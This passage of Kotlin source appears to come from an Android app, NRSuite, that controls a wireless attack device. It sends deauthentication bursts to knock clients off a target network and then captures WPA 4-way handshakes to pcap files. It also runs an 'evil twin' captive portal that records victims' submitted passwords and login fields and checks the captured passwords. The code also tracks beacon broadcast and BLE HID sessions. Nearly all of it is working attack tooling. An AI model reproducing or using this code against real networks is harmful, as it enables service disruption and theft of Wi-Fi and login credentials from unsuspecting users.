            appendLog("Choose an NRSuite root directory before starting a capture.")
            return
        }
        val writerResult = runCatching {
            val pcapDir = ensureChildDirectory(exportUri, "Pcap")
            val pcapDirUri = pcapDir?.uri ?: exportUri
            val documentUri = createPcapDocumentInDirectory(pcapDirUri, captureName)
            val outputStream = app.contentResolver
                .openOutputStream(documentUri, "wt")
                ?: throw IOException("Could not open export file")
            val displayName = displayNameForTreeUri(exportUri)
            PcapWriter(outputStream, closeOutput = true) to "$displayName/Pcap/$captureName"
        }
        val (writer, captureDisplayPath) = writerResult.getOrElse { error ->
            appendLog("Could not create capture output: ${error.message}")
            return
        }

        pcapWriter = writer
        _capturePath.value = captureDisplayPath
        _sniffPacketCount.value = 0
        _sniffHandshake.value = EapolHandshake()
        _sniffing.value = true
        updateForegroundService()

        appendLog("Capture file: $captureDisplayPath")

        val eapolState = EapolHandshake()
        var eapolStopRequested = false
        pcapJob = scope.launch(Dispatchers.IO) {
            activeSession.pcap.collect { frame ->
                val matchesTarget = !request.targetNetworkOnly ||
                    frameMatchesBssid(frame, request.targetBssid)
                if (matchesTarget) {
                    try {
                        writer.writePacket(frame)
                        _sniffPacketCount.update { it + 1 }
                    } catch (t: Throwable) {
                        appendLog("PCAP write error: ${t.message}")
                    }
                }

                if (request.eapolOnly) {
                    EapolParser.parse(frame, eapolState)
                    _sniffHandshake.value = eapolState.copy()
                    val targetMatches = MAC_PATTERN.matches(request.targetBssid.trim().uppercase())
                    if (!eapolStopRequested && targetMatches && eapolState.isComplete) {
                        eapolStopRequested = true
                        appendLog("[+] Valid 4-Way Handshake captured!")
                        stopSniff()
                    }
                }
            }
        }

        scope.launch {
            if (request.deauthBeforeCapture) {
                val cleanBssid = request.targetBssid.trim().uppercase()
                if (MAC_PATTERN.matches(cleanBssid)) {
                    val cleanClient = request.client.trim()
                        .ifBlank { "FF:FF:FF:FF:FF:FF" }
                        .uppercase()
                    appendLog("Sending deauth burst before capture...")
                    val deauthResponse = activeSession.sendCommand(
                        "DEAUTH",
                        JSONObject().apply {
                            put("bssid", cleanBssid)
                            put("client", cleanClient)
                            put("channel", request.channel.coerceIn(1, 13))
                            put("count", request.deauthCount.coerceAtLeast(0))
                            put("deauth_interval_ms", request.deauthIntervalMs.coerceIn(10, 10_000))
                            put("reason", 7)
                        },
                        timeoutMs = 20_000,
                    )
                    if (deauthResponse?.optBoolean("ok") != true) {
                        appendLog("Deauth burst failed or timed out; continuing with capture.")
                    }
                } else {
                    appendLog("Skipping deauth trigger: invalid target BSSID.")
                }
            }

            val cleanFilterBssid = request.targetBssid.trim().uppercase()
            val args = JSONObject().apply {
                put("mode", if (request.fixedMode) "fixed" else "hop")
                put("channel", request.channel.coerceIn(1, 13))
                put("interval_ms", request.intervalMs.coerceIn(50, 2_000))
                if (request.eapolOnly) {
                    put("eapol_only", true)
                }
                if (MAC_PATTERN.matches(cleanFilterBssid)) {
                    put("bssid", cleanFilterBssid)
                }
            }
            val response = activeSession.sendCommand("START_SNIFF", args, timeoutMs = 12_000)
            if (response?.optBoolean("ok") == true) {
                val message = if (request.fixedMode) {
                    "Sniffing started on channel ${request.channel.coerceIn(1, 13)}."
                } else {
                    "Channel-hopping sniffing started."
                }
                appendLog(message)
                addHistory("sniff", message, HistoryLevel.SUCCESS)
            } else {
                appendLog("Failed to start sniffing: ${response?.optString("msg") ?: "timeout"}")
                stopSniff()
            }
        }
    }

    fun stopSniff() {
        if (!_sniffing.value) return
        _sniffing.value = false
        updateForegroundService()

        pcapJob?.cancel()
        pcapJob = null

        val activeSession = session
        scope.launch {
            val response = activeSession?.sendCommand("STOP_SNIFF", timeoutMs = 6_000)
            if (response != null) {
                appendLog(
                    "Capture stopped: captured=${response.optInt("captured")}, " +
                        "sent=${response.optInt("sent")}, dropped=${response.optInt("dropped")}"
                )
            }
            withContext(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
            }
            pcapWriter = null
            _capturePath.value?.let {
                appendLog("Capture saved: $it")
                addHistory("sniff", "Capture saved: $it", HistoryLevel.SUCCESS)
            }
        }
    }

    internal fun activeRadioLabel(includeBle: Boolean = true): String? {
        if (includeBle && (_bleAdvertising.value || _bleConnected.value)) {
            return "BLE HID"
        }
        return when {
            _portalRunning.value -> {
                if (_portalMode.value == "evil_twin") "Evil Twin" else "Captive Portal"
            }
            _sniffing.value -> "Packet Sniffer"
            _beaconRunning.value -> "Beacon Broadcast"
            _deauthRunning.value -> "Deauthentication"
            _scanning.value -> "WiFi Scan"
            else -> null
        }
    }

    private fun ensureRadioIdle(requested: String): Boolean {
        val active = activeRadioLabel()
        if (active == null) return true
        val message = "Cannot start $requested while $active is active. Stop $active first."
        appendLog(message, level = LogLevel.ERROR)
        _actionError.value = message
        return false
    }

    fun consumeActionError() {
        _actionError.value = null
    }

    internal fun updateForegroundService() {
        val context = app
        val activeText = when {
            _sniffing.value -> "Packet capture active"
            _beaconRunning.value -> "Beacon broadcast active"
            _portalRunning.value -> "Captive portal active"
            _deauthRunning.value -> "Deauth burst active"
            _bleAdvertising.value || _bleConnected.value -> "BLE HID active"
            else -> null
        }
        val intent = Intent(context, NrSuiteForegroundService::class.java)
        if (activeText != null) {
            intent.action = NrSuiteForegroundService.ACTION_START
            intent.putExtra(NrSuiteForegroundService.EXTRA_TEXT, activeText)
            ContextCompat.startForegroundService(context, intent)
        } else {
            context.stopService(intent)
        }
    }

    private fun stopLocalPortal(sendStop: Boolean = true) {
        portalStatusJob?.cancel()
        portalStatusJob = null
        if (!_portalRunning.value) return
        _portalRunning.value = false
        if (sendStop) {
            val current = session
            if (current != null) {
                scope.launch {
                    runCatching { current.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
                }
            }
        }
    }

    fun disconnect() {
        val current = session
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        if (_beaconRunning.value) {
            _beaconRunning.value = false
            scope.launch {
                runCatching { current?.sendCommand("STOP_BEACON", timeoutMs = 4_000) }
            }
        }
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            scope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }
        portalStatusJob?.cancel()
        portalStatusJob = null
        session = null
        updateForegroundService()
        scope.launch {
            if (_portalRunning.value) {
                _portalRunning.value = false
                runCatching { current?.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
            }
            updateForegroundService()
            current?.disconnect()
            disconnectInternal()
        }
    }

    internal fun observe(session: NrSession) {
        sessionObservers = listOf(
            scope.launch {
                session.state.collect { _connectionState.value = it }
            },
            scope.launch {
                session.logs.collect { appendLog(it) }
            },
            scope.launch {
                session.events.collect { event ->
                    _events.update { (it + event).takeLast(100) }
                    when (event.optString("type")) {
                        "scan_ap" -> {
                            _networks.update { current ->
                                val bssid = event.optString("bssid")
                                (current.filterNot { it.optString("bssid") == bssid } + event)
                                    .sortedByDescending { it.optInt("rssi", -999) }
                            }
                            val ssid = event.optString("ssid").ifBlank { "(hidden)" }
                            appendLog(
                                "AP: $ssid  ${event.optString("bssid")}  " +
                                    "ch ${event.optInt("channel")}  ${event.optInt("rssi")} dBm  " +
                                    event.optString("security")
                            )
                        }
                        "portal_viewed" -> {
                            _portalViews.update { it + 1 }
                            val ip = event.optString("client_ip", "unknown")
                            appendLog("Portal viewed from $ip.")
                            portalLog("GET / from $ip")
                        }
                        "captive_data" -> {
                            _portalCapturedData.update { it + 1 }
                            val ip = event.optString("ip", "unknown")
                            val userAgent = event.optString("user_agent", "")
                            val data = event.optJSONObject("data")
                            val fields = data?.keys()?.asSequence()?.joinToString(", ") { key ->
                                "$key=${data.optString(key)}"
                            } ?: ""
                            appendLog("Captive data received from $ip.")
                            portalLog("POST /login from $ip | UA: $userAgent | data: $fields")
                            val details = linkedMapOf<String, String>()
                            data?.keys()?.forEach { key ->
                                details[key] = data.optString(key)
                            }

                            val submittedPassword = data?.optString("password").orEmpty().ifBlank {
                                data?.optString("pass").orEmpty()
                            }
                            if (submittedPassword.isNotBlank() && _portalMode.value == "evil_twin") {
                                appendLog("Captured password candidate (${submittedPassword.length} chars).")
                                val capturedAt = java.time.LocalTime.now()
                                    .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
                                _evilTwinPasswords.update {
                                    (it + CapturedPassword(submittedPassword, capturedAt)).takeLast(50)
                                }
                                verifyEvilTwinPasswords()
                            } else if (_portalMode.value == "portal" && details.isNotEmpty()) {
                                val capturedAt = java.time.LocalTime.now()
                                    .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
                                val value = submittedPassword.ifBlank {
                                    details.values.firstOrNull().orEmpty()
                                }
                                val credential = CapturedCredential(
                                    value = value,
                                    capturedAt = capturedAt,
                                    status = CredentialStatus.UNVERIFIED,
                                    source = CredentialSource.PORTAL,
                                    details = details,
                                )
                                synchronized(credentialLock) {
                                    activeCredentialSession = activeCredentialSession
                                        ?.takeIf { it.source == CredentialSource.PORTAL }
                                        ?.let { it.copy(credentials = it.credentials + credential) }
                                }
                                _portalCredentials.update { (it + credential).takeLast(100) }
                                appendLog("Portal credential captured (${details.size} field(s)).")
                            }
                        }
                        "client_associated" -> {
                            _portalClients.update { it + 1 }
                            val client = event.optString("client")
                            val rssi = event.optInt("rssi")
                            appendLog("Client associated: $client ($rssi dBm).")
                            portalLog("Client associated: $client ($rssi dBm)")
                        }
                        "deauth_stats" -> {
                            _deauthSent.value = event.optInt("sent_frames", _deauthSent.value)
                            appendLog("Deauth stats: ${_deauthSent.value} frame(s) sent.")
                            portalLog("Deauth stats: ${_deauthSent.value} frame(s) sent")
                        }
                        "heartbeat" -> Unit
                    }
                }
            },
        )
    }

    internal fun disconnectInternal() {
        stopActiveOperations()
        sessionObservers.forEach { it.cancel() }
        sessionObservers = emptyList()
        session?.let { activeSession ->
            scope.launch { activeSession.disconnect() }
        }
        session = null
        activeDeviceFingerprint = null
        _connectionState.value = ConnectionState.Disconnected
    }

    private fun ensureRootStructure(rootUri: Uri) {
        scope.launch(Dispatchers.IO) {
            val root = DocumentFile.fromTreeUri(app, rootUri)
            if (root == null) {
                appendLog("Could not open the selected NRSuite root directory.")
                return@launch
            }

            val expectedDirectories = listOf("Pcap", "DuckyEditor", "Logs", "Portals")
            val readyDirectories = mutableListOf<String>()
            for (name in expectedDirectories) {
                val existing = root.findFile(name)
                if (existing != null) {
                    readyDirectories += name
                } else if (root.createDirectory(name) != null) {
                    readyDirectories += name
                } else {
                    appendLog("Could not create NRSuite/$name in the selected root.")
                }
            }

            if (readyDirectories.isNotEmpty()) {
                appendLog("NRSuite root ready: ${readyDirectories.joinToString(", ")}.")
            }
        }
    }

    private fun ensureChildDirectory(rootUri: Uri, name: String): DocumentFile? {
        val root = DocumentFile.fromTreeUri(app, rootUri) ?: return null
        return root.findFile(name) ?: root.createDirectory(name)
    }

    private fun createPcapDocumentInDirectory(directoryUri: Uri, displayName: String): Uri {
        return DocumentsContract.createDocument(
            app.contentResolver,
            directoryUri,
            "application/vnd.tcpdump.pcap",
            displayName,
        ) ?: throw IOException("Storage provider did not create a document")
    }

    private fun createPcapDocument(treeUri: Uri, displayName: String): Uri {
        val resolver = app.contentResolver
        val parentDocumentId = DocumentsContract.getTreeDocumentId(treeUri)
        val parentUri = DocumentsContract.buildDocumentUriUsingTree(treeUri, parentDocumentId)
        return DocumentsContract.createDocument(
            resolver,
            parentUri,
            "application/vnd.tcpdump.pcap",
            displayName,
        ) ?: throw IOException("Storage provider did not create a document")
    }

    private fun displayNameForTreeUri(uri: Uri): String {
        val documentId = runCatching { DocumentsContract.getTreeDocumentId(uri) }.getOrNull()
        val fromDocumentId = documentId
            ?.substringAfterLast('/')
            ?.substringAfterLast(':')
            ?.trim()
        if (!fromDocumentId.isNullOrBlank()) {
            return fromDocumentId
        }
        return uri.lastPathSegment?.substringAfterLast(':')?.substringAfterLast('/')?.trim()
            ?.takeIf { it.isNotBlank() }
            ?: "Selected folder"
    }

    private fun exportPcapToRootIfConfigured(sourceFile: File?) {
        val rootUri = _exportDirectory.value ?: return
        if (sourceFile == null || !sourceFile.exists() || sourceFile.length() == 0L) return

        val key = sourceFile.absolutePath
        synchronized(exportedCapturePaths) {
            if (!exportedCapturePaths.add(key)) return
        }

        scope.launch(Dispatchers.IO) {
            runCatching {
                val pcapDirUri = ensureChildDirectory(rootUri, "Pcap")?.uri ?: rootUri
                val displayName = sourceFile.name
                val documentUri = createPcapDocumentInDirectory(pcapDirUri, displayName)
                app.contentResolver.openOutputStream(documentUri, "wt")?.use { output ->
                    sourceFile.inputStream().use { input ->
                        input.copyTo(output)
                    }
                } ?: throw IOException("Could not open export file")

                appendLog(
                    "Evil Twin PCAP exported to " +
                        "${displayNameForTreeUri(rootUri)}/Pcap/$displayName",
                )
            }.onFailure { error ->
                synchronized(exportedCapturePaths) {
                    exportedCapturePaths.remove(key)
                }
                appendLog("Could not export Evil Twin PCAP: ${error.message}", level = LogLevel.ERROR)
            }
        }
    }

    private fun frameMatchesBssid(frame: ByteArray, bssid: String): Boolean {
        val parts = bssid.trim().uppercase().split(":")
        if (parts.size != 6) return false
        val target = ByteArray(6) { index ->
            parts[index].toIntOrNull(16)?.toByte() ?: return false
        }
        if (frame.size < 8) return false
        val radiotapLength = (frame[2].toInt() and 0xFF) or
            ((frame[3].toInt() and 0xFF) shl 8)
        val macBase = radiotapLength
        if (frame.size < macBase + 22) return false
        for (offset in intArrayOf(4, 10, 16)) {
            var matches = true
            for (i in 0 until 6) {
                if (frame[macBase + offset + i] != target[i]) {
                    matches = false
                    break
                }
            }
            if (matches) return true
        }
        return false
    }

    internal fun appendLog(
        message: String,
        level: LogLevel = LogLevel.INFO,
        tag: String = "app",
    ) {
        val entry = LogEntry(
            timestamp = java.time.LocalTime.now()
                .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss")),
            level = level,
            tag = tag,
            message = message,
        )
        _logs.update { (it + entry).takeLast(300) }
    }

    companion object {
        private const val PREFERENCES_NAME = "nrsuite"
        private const val PREF_EXPORT_DIRECTORY = "export_directory_uri"
        private const val PREF_BEACON_LISTS = "beacon_lists"
        private const val PREF_HISTORY = "session_history"
        internal const val PREF_LAST_DEVICE_FINGERPRINT = "last_device_fingerprint"
        private const val PREF_RECENT_MODULES = "recent_modules"
        private val MAC_PATTERN = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
        private const val HTML_RAW_CHUNK_SIZE = 512
        private const val HTML_TAIL_ALLOWANCE = 64
    }
}
